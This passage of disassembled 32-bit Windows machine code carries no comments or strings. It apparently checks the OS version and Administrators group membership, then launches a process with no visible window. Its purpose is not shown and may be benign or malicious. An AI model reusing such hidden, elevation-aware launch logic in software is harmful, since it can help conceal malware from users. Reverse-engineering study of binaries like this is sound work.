  40221b:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40221e:	e8 6a 0e 00 00       	call   0x40308d
  402223:	83 c4 10             	add    $0x10,%esp
  402226:	89 5f 04             	mov    %ebx,0x4(%edi)
  402229:	8d 46 0c             	lea    0xc(%esi),%eax
  40222c:	83 c9 ff             	or     $0xffffffff,%ecx
  40222f:	f0 0f c1 08          	lock xadd %ecx,(%eax)
  402233:	49                   	dec    %ecx
  402234:	85 c9                	test   %ecx,%ecx
  402236:	7f 0a                	jg     0x402242
  402238:	8b 0e                	mov    (%esi),%ecx
  40223a:	8b 11                	mov    (%ecx),%edx
  40223c:	8b 42 04             	mov    0x4(%edx),%eax
  40223f:	56                   	push   %esi
  402240:	ff d0                	call   *%eax
  402242:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402245:	8b 55 08             	mov    0x8(%ebp),%edx
  402248:	5f                   	pop    %edi
  402249:	5e                   	pop    %esi
  40224a:	89 0a                	mov    %ecx,(%edx)
  40224c:	5b                   	pop    %ebx
  40224d:	5d                   	pop    %ebp
  40224e:	c2 08 00             	ret    $0x8
  402251:	cc                   	int3
  402252:	cc                   	int3
  402253:	cc                   	int3
  402254:	cc                   	int3
  402255:	cc                   	int3
  402256:	cc                   	int3
  402257:	cc                   	int3
  402258:	cc                   	int3
  402259:	cc                   	int3
  40225a:	cc                   	int3
  40225b:	cc                   	int3
  40225c:	cc                   	int3
  40225d:	cc                   	int3
  40225e:	cc                   	int3
  40225f:	cc                   	int3
  402260:	8b 06                	mov    (%esi),%eax
  402262:	8b 48 f0             	mov    -0x10(%eax),%ecx
  402265:	83 e8 10             	sub    $0x10,%eax
  402268:	39 50 08             	cmp    %edx,0x8(%eax)
  40226b:	7d 15                	jge    0x402282
  40226d:	85 d2                	test   %edx,%edx
  40226f:	7e 11                	jle    0x402282
  402271:	57                   	push   %edi
  402272:	8b 39                	mov    (%ecx),%edi
  402274:	6a 02                	push   $0x2
  402276:	52                   	push   %edx
  402277:	50                   	push   %eax
  402278:	8b 47 08             	mov    0x8(%edi),%eax
  40227b:	ff d0                	call   *%eax
  40227d:	5f                   	pop    %edi
  40227e:	85 c0                	test   %eax,%eax
  402280:	75 05                	jne    0x402287
  402282:	e8 79 f0 ff ff       	call   0x401300
  402287:	83 c0 10             	add    $0x10,%eax
  40228a:	89 06                	mov    %eax,(%esi)
  40228c:	c3                   	ret
  40228d:	cc                   	int3
  40228e:	cc                   	int3
  40228f:	cc                   	int3
  402290:	55                   	push   %ebp
  402291:	8b ec                	mov    %esp,%ebp
  402293:	8b 45 08             	mov    0x8(%ebp),%eax
  402296:	56                   	push   %esi
  402297:	50                   	push   %eax
  402298:	8b f1                	mov    %ecx,%esi
  40229a:	e8 ca 0f 00 00       	call   0x403269
  40229f:	c7 06 a8 b2 40 00    	movl   $0x40b2a8,(%esi)
  4022a5:	8b c6                	mov    %esi,%eax
  4022a7:	5e                   	pop    %esi
  4022a8:	5d                   	pop    %ebp
  4022a9:	c2 04 00             	ret    $0x4
  4022ac:	cc                   	int3
  4022ad:	cc                   	int3
  4022ae:	cc                   	int3
  4022af:	cc                   	int3
  4022b0:	55                   	push   %ebp
  4022b1:	8b ec                	mov    %esp,%ebp
  4022b3:	83 e4 f8             	and    $0xfffffff8,%esp
  4022b6:	6a ff                	push   $0xffffffff
  4022b8:	68 98 a4 40 00       	push   $0x40a498
  4022bd:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4022c3:	50                   	push   %eax
  4022c4:	83 ec 38             	sub    $0x38,%esp
  4022c7:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4022cc:	33 c4                	xor    %esp,%eax
  4022ce:	89 44 24 30          	mov    %eax,0x30(%esp)
  4022d2:	53                   	push   %ebx
  4022d3:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4022d8:	33 c4                	xor    %esp,%eax
  4022da:	50                   	push   %eax
  4022db:	8d 44 24 40          	lea    0x40(%esp),%eax
  4022df:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4022e5:	e8 c6 01 00 00       	call   0x4024b0
  4022ea:	68 d0 d2 40 00       	push   $0x40d2d0
  4022ef:	ff 15 44 b0 40 00    	call   *0x40b044
  4022f5:	68 e4 d2 40 00       	push   $0x40d2e4
  4022fa:	50                   	push   %eax
  4022fb:	ff 15 48 b0 40 00    	call   *0x40b048
  402301:	33 db                	xor    %ebx,%ebx
  402303:	3b c3                	cmp    %ebx,%eax
  402305:	74 22                	je     0x402329
  402307:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40230b:	51                   	push   %ecx
  40230c:	8d 54 24 14          	lea    0x14(%esp),%edx
  402310:	52                   	push   %edx
  402311:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402315:	51                   	push   %ecx
  402316:	ff d0                	call   *%eax
  402318:	83 7c 24 0c 0a       	cmpl   $0xa,0xc(%esp)
  40231d:	75 0a                	jne    0x402329
  40231f:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  402323:	0f 84 bb 00 00 00    	je     0x4023e4
  402329:	8d 54 24 10          	lea    0x10(%esp),%edx
  40232d:	52                   	push   %edx
  40232e:	53                   	push   %ebx
  40232f:	53                   	push   %ebx
  402330:	53                   	push   %ebx
  402331:	53                   	push   %ebx
  402332:	53                   	push   %ebx
  402333:	53                   	push   %ebx
  402334:	68 20 02 00 00       	push   $0x220
  402339:	6a 20                	push   $0x20
  40233b:	6a 02                	push   $0x2
  40233d:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  402341:	50                   	push   %eax
  402342:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  402346:	66 c7 44 24 44 00 05 	movw   $0x500,0x44(%esp)
  40234d:	ff 15 2c b0 40 00    	call   *0x40b02c
  402353:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402357:	3b c3                	cmp    %ebx,%eax
  402359:	74 20                	je     0x40237b
  40235b:	8b 54 24 10          	mov    0x10(%esp),%edx
  40235f:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402363:	51                   	push   %ecx
  402364:	52                   	push   %edx
  402365:	53                   	push   %ebx
  402366:	ff 15 28 b0 40 00    	call   *0x40b028
  40236c:	8b 44 24 10          	mov    0x10(%esp),%eax
  402370:	50                   	push   %eax
  402371:	ff 15 24 b0 40 00    	call   *0x40b024
  402377:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40237b:	83 f8 01             	cmp    $0x1,%eax
  40237e:	75 09                	jne    0x402389
  402380:	e8 8b ef ff ff       	call   0x401310
  402385:	85 c0                	test   %eax,%eax
  402387:	75 5b                	jne    0x4023e4
  402389:	83 ec 1c             	sub    $0x1c,%esp
  40238c:	8b cc                	mov    %esp,%ecx
  40238e:	89 59 10             	mov    %ebx,0x10(%ecx)
  402391:	c7 41 14 0f 00 00 00 	movl   $0xf,0x14(%ecx)
  402398:	88 19                	mov    %bl,(%ecx)
  40239a:	83 c8 ff             	or     $0xffffffff,%eax
  40239d:	33 db                	xor    %ebx,%ebx
  40239f:	89 64 24 30          	mov    %esp,0x30(%esp)
  4023a3:	e8 78 f6 ff ff       	call   0x401a20
  4023a8:	8d 5c 24 38          	lea    0x38(%esp),%ebx
  4023ac:	e8 0f f3 ff ff       	call   0x4016c0
  4023b1:	83 c4 1c             	add    $0x1c,%esp
  4023b4:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  4023bb:	00 
  4023bc:	83 7c 24 30 08       	cmpl   $0x8,0x30(%esp)
  4023c1:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4023c5:	73 02                	jae    0x4023c9
  4023c7:	8b cb                	mov    %ebx,%ecx
  4023c9:	e8 f2 06 00 00       	call   0x402ac0
  4023ce:	83 7c 24 30 08       	cmpl   $0x8,0x30(%esp)
  4023d3:	72 36                	jb     0x40240b
  4023d5:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4023d9:	51                   	push   %ecx
  4023da:	e8 94 0c 00 00       	call   0x403073
  4023df:	83 c4 04             	add    $0x4,%esp
  4023e2:	eb 27                	jmp    0x40240b
  4023e4:	83 3d b0 07 41 00 10 	cmpl   $0x10,0x4107b0
  4023eb:	a1 9c 07 41 00       	mov    0x41079c,%eax
  4023f0:	73 05                	jae    0x4023f7
  4023f2:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  4023f7:	50                   	push   %eax
  4023f8:	e8 33 00 00 00       	call   0x402430
  4023fd:	83 c4 04             	add    $0x4,%esp
  402400:	68 f4 01 00 00       	push   $0x1f4
  402405:	ff 15 4c b0 40 00    	call   *0x40b04c
  40240b:	33 c0                	xor    %eax,%eax
  40240d:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  402411:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402418:	59                   	pop    %ecx
  402419:	5b                   	pop    %ebx
  40241a:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  40241e:	33 cc                	xor    %esp,%ecx
  402420:	e8 59 0c 00 00       	call   0x40307e
  402425:	8b e5                	mov    %ebp,%esp
  402427:	5d                   	pop    %ebp
  402428:	c3                   	ret
  402429:	cc                   	int3
  40242a:	cc                   	int3
  40242b:	cc                   	int3
  40242c:	cc                   	int3
  40242d:	cc                   	int3
  40242e:	cc                   	int3
  40242f:	cc                   	int3
  402430:	55                   	push   %ebp
  402431:	8b ec                	mov    %esp,%ebp
  402433:	83 ec 60             	sub    $0x60,%esp
  402436:	56                   	push   %esi
  402437:	33 c0                	xor    %eax,%eax
  402439:	33 c9                	xor    %ecx,%ecx
  40243b:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40243e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  402441:	51                   	push   %ecx
  402442:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402445:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  402448:	52                   	push   %edx
  402449:	50                   	push   %eax
  40244a:	50                   	push   %eax
  40244b:	68 00 00 00 08       	push   $0x8000000
  402450:	50                   	push   %eax
  402451:	50                   	push   %eax
  402452:	50                   	push   %eax
  402453:	51                   	push   %ecx
  402454:	50                   	push   %eax
  402455:	c7 45 a4 44 00 00 00 	movl   $0x44,-0x5c(%ebp)
  40245c:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40245f:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402462:	89 45 ac             	mov    %eax,-0x54(%ebp)
  402465:	89 45 b0             	mov    %eax,-0x50(%ebp)
  402468:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  40246f:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402472:	89 45 b8             	mov    %eax,-0x48(%ebp)
  402475:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402478:	ff 15 50 b0 40 00    	call   *0x40b050
  40247e:	85 c0                	test   %eax,%eax
  402480:	74 1c                	je     0x40249e
  402482:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402485:	8b 35 dc b0 40 00    	mov    0x40b0dc,%esi
  40248b:	52                   	push   %edx
  40248c:	ff d6                	call   *%esi
  40248e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402491:	50                   	push   %eax
  402492:	ff d6                	call   *%esi
  402494:	b8 01 00 00 00       	mov    $0x1,%eax
  402499:	5e                   	pop    %esi
  40249a:	8b e5                	mov    %ebp,%esp
  40249c:	5d                   	pop    %ebp
  40249d:	c3                   	ret
  40249e:	33 c0                	xor    %eax,%eax
  4024a0:	5e                   	pop    %esi
  4024a1:	8b e5                	mov    %ebp,%esp
  4024a3:	5d                   	pop    %ebp
  4024a4:	c3                   	ret
  4024a5:	cc                   	int3
  4024a6:	cc                   	int3
  4024a7:	cc                   	int3
  4024a8:	cc                   	int3
  4024a9:	cc                   	int3
  4024aa:	cc                   	int3
  4024ab:	cc                   	int3
  4024ac:	cc                   	int3
  4024ad:	cc                   	int3
  4024ae:	cc                   	int3
  4024af:	cc                   	int3
  4024b0:	55                   	push   %ebp
  4024b1:	8b ec                	mov    %esp,%ebp
  4024b3:	6a ff                	push   $0xffffffff
  4024b5:	68 61 a4 40 00       	push   $0x40a461
  4024ba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4024c0:	50                   	push   %eax
  4024c1:	81 ec 34 06 00 00    	sub    $0x634,%esp
  4024c7:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  4024cc:	33 c5                	xor    %ebp,%eax
  4024ce:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4024d1:	53                   	push   %ebx
  4024d2:	56                   	push   %esi
  4024d3:	57                   	push   %edi
  4024d4:	50                   	push   %eax
  4024d5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4024d8:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4024de:	68 04 06 00 00       	push   $0x604
  4024e3:	8d 85 e8 f9 ff ff    	lea    -0x618(%ebp),%eax
  4024e9:	6a 00                	push   $0x0
  4024eb:	50                   	push   %eax
  4024ec:	e8 ff 16 00 00       	call   0x403bf0
  4024f1:	83 c4 0c             	add    $0xc,%esp
  4024f4:	68 b4 05 00 00       	push   $0x5b4
  4024f9:	8d 8d e8 f9 ff ff    	lea    -0x618(%ebp),%ecx
  4024ff:	51                   	push   %ecx
  402500:	6a 00                	push   $0x0
  402502:	ff 15 54 b0 40 00    	call   *0x40b054
  402508:	8d 95 e8 f9 ff ff    	lea    -0x618(%ebp),%edx
  40250e:	6a 5c                	push   $0x5c
  402510:	52                   	push   %edx
  402511:	e8 1a 12 00 00       	call   0x403730
  402516:	83 c4 08             	add    $0x8,%esp
  402519:	85 c0                	test   %eax,%eax
  40251b:	74 04                	je     0x402521
  40251d:	c6 40 01 00          	movb   $0x0,0x1(%eax)
  402521:	8d 85 e8 f9 ff ff    	lea    -0x618(%ebp),%eax
  402527:	8d 50 01             	lea    0x1(%eax),%edx
  40252a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  402530:	8a 08                	mov    (%eax),%cl
  402532:	40                   	inc    %eax
  402533:	84 c9                	test   %cl,%cl
  402535:	75 f9                	jne    0x402530
  402537:	2b c2                	sub    %edx,%eax
  402539:	8b f0                	mov    %eax,%esi
  40253b:	8d 85 e8 f9 ff ff    	lea    -0x618(%ebp),%eax
  402541:	e8 ea f2 ff ff       	call   0x401830
  402546:	bf 10 00 00 00       	mov    $0x10,%edi
  40254b:	e8 60 01 00 00       	call   0x4026b0
  402550:	83 ec 1c             	sub    $0x1c,%esp
  402553:	8b cc                	mov    %esp,%ecx
  402555:	c7 41 14 0f 00 00 00 	movl   $0xf,0x14(%ecx)
  40255c:	c7 41 10 00 00 00 00 	movl   $0x0,0x10(%ecx)
  402563:	83 c8 ff             	or     $0xffffffff,%eax
  402566:	33 db                	xor    %ebx,%ebx
  402568:	89 a5 c8 f9 ff ff    	mov    %esp,-0x638(%ebp)
  40256e:	c6 01 00             	movb   $0x0,(%ecx)
  402571:	e8 aa f4 ff ff       	call   0x401a20
  402576:	8d 9d cc f9 ff ff    	lea    -0x634(%ebp),%ebx
  40257c:	e8 3f f1 ff ff       	call   0x4016c0
  402581:	83 c4 1c             	add    $0x1c,%esp
  402584:	be 08 00 00 00       	mov    $0x8,%esi
  402589:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402590:	39 70 14             	cmp    %esi,0x14(%eax)
  402593:	72 04                	jb     0x402599
  402595:	8b 18                	mov    (%eax),%ebx
  402597:	eb 02                	jmp    0x40259b
  402599:	8b d8                	mov    %eax,%ebx
  40259b:	a1 60 f0 40 00       	mov    0x40f060,%eax
  4025a0:	8b 50 0c             	mov    0xc(%eax),%edx
  4025a3:	b9 60 f0 40 00       	mov    $0x40f060,%ecx
  4025a8:	ff d2                	call   *%edx
  4025aa:	83 c0 10             	add    $0x10,%eax
  4025ad:	89 85 c8 f9 ff ff    	mov    %eax,-0x638(%ebp)
  4025b3:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4025b7:	85 db                	test   %ebx,%ebx
  4025b9:	74 28                	je     0x4025e3
  4025bb:	f7 c3 00 00 ff ff    	test   $0xffff0000,%ebx
  4025c1:	75 24                	jne    0x4025e7
  4025c3:	0f b7 fb             	movzwl %bx,%edi
  4025c6:	57                   	push   %edi
  4025c7:	e8 54 ef ff ff       	call   0x401520
  4025cc:	83 c4 04             	add    $0x4,%esp
  4025cf:	85 c0                	test   %eax,%eax
  4025d1:	74 3a                	je     0x40260d
  4025d3:	50                   	push   %eax
  4025d4:	8b c7                	mov    %edi,%eax
  4025d6:	8d bd c8 f9 ff ff    	lea    -0x638(%ebp),%edi
  4025dc:	e8 4f f8 ff ff       	call   0x401e30
  4025e1:	eb 2a                	jmp    0x40260d
  4025e3:	33 c0                	xor    %eax,%eax
  4025e5:	eb 18                	jmp    0x4025ff
  4025e7:	8b c3                	mov    %ebx,%eax
  4025e9:	8d 50 02             	lea    0x2(%eax),%edx
  4025ec:	8d 64 24 00          	lea    0x0(%esp),%esp
  4025f0:	66 8b 08             	mov    (%eax),%cx
  4025f3:	83 c0 02             	add    $0x2,%eax
  4025f6:	66 85 c9             	test   %cx,%cx
  4025f9:	75 f5                	jne    0x4025f0
  4025fb:	2b c2                	sub    %edx,%eax
  4025fd:	d1 f8                	sar    $1,%eax
  4025ff:	53                   	push   %ebx
  402600:	8b f8                	mov    %eax,%edi
  402602:	8d 9d c8 f9 ff ff    	lea    -0x638(%ebp),%ebx
  402608:	e8 13 02 00 00       	call   0x402820
  40260d:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  402611:	39 b5 e0 f9 ff ff    	cmp    %esi,-0x620(%ebp)
  402617:	72 0f                	jb     0x402628
  402619:	8b 85 cc f9 ff ff    	mov    -0x634(%ebp),%eax
  40261f:	50                   	push   %eax
  402620:	e8 4e 0a 00 00       	call   0x403073
  402625:	83 c4 04             	add    $0x4,%esp
  402628:	8b b5 c8 f9 ff ff    	mov    -0x638(%ebp),%esi
  40262e:	33 c9                	xor    %ecx,%ecx
  402630:	51                   	push   %ecx
  402631:	83 c6 f0             	add    $0xfffffff0,%esi
  402634:	8b c6                	mov    %esi,%eax
  402636:	c7 85 e0 f9 ff ff 07 	movl   $0x7,-0x620(%ebp)
  40263d:	00 00 00 
  402640:	c7 85 dc f9 ff ff 00 	movl   $0x0,-0x624(%ebp)
  402647:	00 00 00 
  40264a:	66 89 8d cc f9 ff ff 	mov    %cx,-0x634(%ebp)
  402651:	89 a5 c4 f9 ff ff    	mov    %esp,-0x63c(%ebp)
  402657:	8b fc                	mov    %esp,%edi
  402659:	e8 32 ec ff ff       	call   0x401290
  40265e:	83 c0 10             	add    $0x10,%eax
  402661:	89 07                	mov    %eax,(%edi)
  402663:	e8 48 ea ff ff       	call   0x4010b0
  402668:	83 c4 04             	add    $0x4,%esp
  40266b:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  402672:	8d 56 0c             	lea    0xc(%esi),%edx
  402675:	83 c8 ff             	or     $0xffffffff,%eax
  402678:	f0 0f c1 02          	lock xadd %eax,(%edx)
  40267c:	48                   	dec    %eax
  40267d:	85 c0                	test   %eax,%eax
  40267f:	7f 0a                	jg     0x40268b
  402681:	8b 0e                	mov    (%esi),%ecx
  402683:	8b 11                	mov    (%ecx),%edx
  402685:	8b 42 04             	mov    0x4(%edx),%eax
  402688:	56                   	push   %esi
  402689:	ff d0                	call   *%eax
  40268b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40268e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402695:	59                   	pop    %ecx
  402696:	5f                   	pop    %edi
  402697:	5e                   	pop    %esi
  402698:	5b                   	pop    %ebx
  402699:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40269c:	33 cd                	xor    %ebp,%ecx
  40269e:	e8 db 09 00 00       	call   0x40307e
  4026a3:	8b e5                	mov    %ebp,%esp
  4026a5:	5d                   	pop    %ebp
  4026a6:	c3                   	ret
  4026a7:	cc                   	int3
  4026a8:	cc                   	int3
  4026a9:	cc                   	int3
  4026aa:	cc                   	int3
  4026ab:	cc                   	int3
  4026ac:	cc                   	int3
  4026ad:	cc                   	int3
  4026ae:	cc                   	int3
  4026af:	cc                   	int3
  4026b0:	a1 9c 07 41 00       	mov    0x41079c,%eax
  4026b5:	53                   	push   %ebx
  4026b6:	56                   	push   %esi
  4026b7:	8b 35 b0 07 41 00    	mov    0x4107b0,%esi
  4026bd:	bb 10 00 00 00       	mov    $0x10,%ebx
  4026c2:	8b c8                	mov    %eax,%ecx
  4026c4:	3b f3                	cmp    %ebx,%esi
  4026c6:	73 05                	jae    0x4026cd
  4026c8:	b9 9c 07 41 00       	mov    $0x41079c,%ecx
  4026cd:	8b 15 ac 07 41 00    	mov    0x4107ac,%edx
  4026d3:	81 f9 fc d2 40 00    	cmp    $0x40d2fc,%ecx
  4026d9:	77 2f                	ja     0x40270a
  4026db:	8b c8                	mov    %eax,%ecx
  4026dd:	3b f3                	cmp    %ebx,%esi
  4026df:	73 05                	jae    0x4026e6
  4026e1:	b9 9c 07 41 00       	mov    $0x41079c,%ecx
  4026e6:	03 ca                	add    %edx,%ecx
  4026e8:	81 f9 fc d2 40 00    	cmp    $0x40d2fc,%ecx
  4026ee:	76 1a                	jbe    0x40270a
  4026f0:	3b f3                	cmp    %ebx,%esi
  4026f2:	73 05                	jae    0x4026f9
  4026f4:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  4026f9:	bb fc d2 40 00       	mov    $0x40d2fc,%ebx
  4026fe:	2b d8                	sub    %eax,%ebx
  402700:	8b c7                	mov    %edi,%eax
  402702:	e8 79 00 00 00       	call   0x402780
  402707:	5e                   	pop    %esi
  402708:	5b                   	pop    %ebx
  402709:	c3                   	ret
  40270a:	83 c8 ff             	or     $0xffffffff,%eax
  40270d:	2b c2                	sub    %edx,%eax
  40270f:	3b c7                	cmp    %edi,%eax
  402711:	77 0a                	ja     0x40271d
  402713:	68 c0 d2 40 00       	push   $0x40d2c0
  402718:	e8 6c 05 00 00       	call   0x402c89
  40271d:	85 ff                	test   %edi,%edi
  40271f:	74 54                	je     0x402775
  402721:	8d 34 3a             	lea    (%edx,%edi,1),%esi
  402724:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  402729:	e8 d2 f3 ff ff       	call   0x401b00
  40272e:	84 c0                	test   %al,%al
  402730:	74 43                	je     0x402775
  402732:	a1 9c 07 41 00       	mov    0x41079c,%eax
  402737:	39 1d b0 07 41 00    	cmp    %ebx,0x4107b0
  40273d:	73 05                	jae    0x402744
  40273f:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  402744:	03 05 ac 07 41 00    	add    0x4107ac,%eax
  40274a:	57                   	push   %edi
  40274b:	68 fc d2 40 00       	push   $0x40d2fc
  402750:	50                   	push   %eax
  402751:	e8 1a 16 00 00       	call   0x403d70
  402756:	a1 9c 07 41 00       	mov    0x41079c,%eax
  40275b:	83 c4 0c             	add    $0xc,%esp
  40275e:	89 35 ac 07 41 00    	mov    %esi,0x4107ac
  402764:	39 1d b0 07 41 00    	cmp    %ebx,0x4107b0
  40276a:	73 05                	jae    0x402771
  40276c:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  402771:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  402775:	5e                   	pop    %esi
  402776:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  40277b:	5b                   	pop    %ebx
  40277c:	c3                   	ret
  40277d:	cc                   	int3
  40277e:	cc                   	int3
  40277f:	cc                   	int3
  402780:	8b 0d ac 07 41 00    	mov    0x4107ac,%ecx
  402786:	57                   	push   %edi
  402787:	8b f8                	mov    %eax,%edi
  402789:	3b cb                	cmp    %ebx,%ecx
  40278b:	73 0a                	jae    0x402797
  40278d:	68 a8 d2 40 00       	push   $0x40d2a8
  402792:	e8 3f 05 00 00       	call   0x402cd6
  402797:	8b c1                	mov    %ecx,%eax
  402799:	2b c3                	sub    %ebx,%eax
  40279b:	3b c7                	cmp    %edi,%eax
  40279d:	73 02                	jae    0x4027a1
  40279f:	8b f8                	mov    %eax,%edi
  4027a1:	83 c8 ff             	or     $0xffffffff,%eax
  4027a4:	2b c1                	sub    %ecx,%eax
  4027a6:	3b c7                	cmp    %edi,%eax
  4027a8:	77 0a                	ja     0x4027b4
  4027aa:	68 c0 d2 40 00       	push   $0x40d2c0
  4027af:	e8 d5 04 00 00       	call   0x402c89
  4027b4:	85 ff                	test   %edi,%edi
  4027b6:	74 5c                	je     0x402814
  4027b8:	56                   	push   %esi
  4027b9:	8d 34 39             	lea    (%ecx,%edi,1),%esi
  4027bc:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  4027c1:	e8 3a f3 ff ff       	call   0x401b00
  4027c6:	84 c0                	test   %al,%al
  4027c8:	74 49                	je     0x402813
  4027ca:	8b 15 b0 07 41 00    	mov    0x4107b0,%edx
  4027d0:	a1 9c 07 41 00       	mov    0x41079c,%eax
  4027d5:	8b c8                	mov    %eax,%ecx
  4027d7:	83 fa 10             	cmp    $0x10,%edx
  4027da:	73 07                	jae    0x4027e3
  4027dc:	b9 9c 07 41 00       	mov    $0x41079c,%ecx
  4027e1:	8b c1                	mov    %ecx,%eax
  4027e3:	03 05 ac 07 41 00    	add    0x4107ac,%eax
  4027e9:	57                   	push   %edi
  4027ea:	03 cb                	add    %ebx,%ecx
  4027ec:	51                   	push   %ecx
  4027ed:	50                   	push   %eax
  4027ee:	e8 7d 15 00 00       	call   0x403d70
  4027f3:	a1 9c 07 41 00       	mov    0x41079c,%eax
  4027f8:	83 c4 0c             	add    $0xc,%esp
  4027fb:	83 3d b0 07 41 00 10 	cmpl   $0x10,0x4107b0
  402802:	89 35 ac 07 41 00    	mov    %esi,0x4107ac
  402808:	73 05                	jae    0x40280f
  40280a:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  40280f:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  402813:	5e                   	pop    %esi
  402814:	b8 9c 07 41 00       	mov    $0x41079c,%eax
  402819:	5f                   	pop    %edi
  40281a:	c3                   	ret
  40281b:	cc                   	int3
  40281c:	cc                   	int3
  40281d:	cc                   	int3
  40281e:	cc                   	int3
  40281f:	cc                   	int3
  402820:	55                   	push   %ebp
  402821:	8b ec                	mov    %esp,%ebp
  402823:	51                   	push   %ecx
  402824:	56                   	push   %esi
  402825:	85 ff                	test   %edi,%edi
  402827:	75 68                	jne    0x402891
  402829:	8b 0b                	mov    (%ebx),%ecx
  40282b:	8b 71 f0             	mov    -0x10(%ecx),%esi
  40282e:	39 79 f4             	cmp    %edi,-0xc(%ecx)
  402831:	8d 41 f0             	lea    -0x10(%ecx),%eax
  402834:	0f 84 ee 00 00 00    	je     0x402928
  40283a:	39 78 0c             	cmp    %edi,0xc(%eax)
  40283d:	8d 50 0c             	lea    0xc(%eax),%edx
  402840:	7d 24                	jge    0x402866
  402842:	39 79 f8             	cmp    %edi,-0x8(%ecx)
  402845:	7d 0a                	jge    0x402851
  402847:	68 57 00 07 80       	push   $0x80070057
  40284c:	e8 af e7 ff ff       	call   0x401000
  402851:	c7 41 f4 00 00 00 00 	movl   $0x0,-0xc(%ecx)
  402858:	8b 03                	mov    (%ebx),%eax
  40285a:	33 c9                	xor    %ecx,%ecx
  40285c:	66 89 08             	mov    %cx,(%eax)
  40285f:	5e                   	pop    %esi
  402860:	8b e5                	mov    %ebp,%esp
  402862:	5d                   	pop    %ebp
  402863:	c2 04 00             	ret    $0x4
  402866:	83 c9 ff             	or     $0xffffffff,%ecx
  402869:	f0 0f c1 0a          	lock xadd %ecx,(%edx)
  40286d:	49                   	dec    %ecx
  40286e:	85 c9                	test   %ecx,%ecx
  402870:	7f 0a                	jg     0x40287c
  402872:	8b 08                	mov    (%eax),%ecx
  402874:	8b 11                	mov    (%ecx),%edx
  402876:	50                   	push   %eax
  402877:	8b 42 04             	mov    0x4(%edx),%eax
  40287a:	ff d0                	call   *%eax
  40287c:	8b 16                	mov    (%esi),%edx
  40287e:	8b 42 0c             	mov    0xc(%edx),%eax
  402881:	8b ce                	mov    %esi,%ecx
  402883:	ff d0                	call   *%eax
  402885:	83 c0 10             	add    $0x10,%eax
  402888:	89 03                	mov    %eax,(%ebx)
  40288a:	5e                   	pop    %esi
  40288b:	8b e5                	mov    %ebp,%esp
  40288d:	5d                   	pop    %ebp
  40288e:	c2 04 00             	ret    $0x4
  402891:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402894:	85 c9                	test   %ecx,%ecx
  402896:	75 0a                	jne    0x4028a2
  402898:	68 57 00 07 80       	push   $0x80070057
  40289d:	e8 5e e7 ff ff       	call   0x401000
  4028a2:	8b 03                	mov    (%ebx),%eax
  4028a4:	8b 50 f4             	mov    -0xc(%eax),%edx
  4028a7:	8b f1                	mov    %ecx,%esi
  4028a9:	2b f0                	sub    %eax,%esi
  4028ab:	d1 fe                	sar    $1,%esi
  4028ad:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4028b0:	85 ff                	test   %edi,%edi
  4028b2:	79 0a                	jns    0x4028be
  4028b4:	68 57 00 07 80       	push   $0x80070057
  4028b9:	e8 42 e7 ff ff       	call   0x401000
  4028be:	ba 01 00 00 00       	mov    $0x1,%edx
  4028c3:	2b 50 fc             	sub    -0x4(%eax),%edx
  4028c6:	8b 40 f8             	mov    -0x8(%eax),%eax
  4028c9:	2b c7                	sub    %edi,%eax
  4028cb:	0b d0                	or     %eax,%edx
  4028cd:	7d 0c                	jge    0x4028db
  4028cf:	8b c7                	mov    %edi,%eax
  4028d1:	8b cb                	mov    %ebx,%ecx
  4028d3:	e8 48 f8 ff ff       	call   0x402120
